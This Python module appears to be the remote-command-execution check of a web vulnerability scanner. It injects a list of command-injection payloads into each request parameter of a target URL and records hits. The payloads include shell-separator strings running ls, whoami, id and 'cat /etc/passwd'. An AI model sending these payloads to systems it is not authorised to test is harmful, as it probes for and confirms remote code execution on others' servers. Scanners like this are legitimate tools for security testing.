from typing import Dict, List
from core.request_handler import RequestHandler
from core.vulnerability_detector import VulnerabilityDetector

class RCEScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
        self.vulnerability_detector = VulnerabilityDetector()
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'cmd': '', 'command': ''}
        payloads = [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "; id"
        ]
        for param_name in parameters.keys():
            for payload in payloads:
                test_params = parameters.copy()
                test_params[param_name] = payload
                response = self.request_handler.send_request(
                    url,
                    method='POST' if '?' not in url else 'GET',
                    data=test_params
                )
                is_vulnerable, details = self.vulnerability_detector.detect(
                    response,
                    'RCE',
                    payload
                )
                if is_vulnerable:
                    vulnerabilities.append({
                        'type': 'RCE',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        **details
                    })
        return vulnerabilities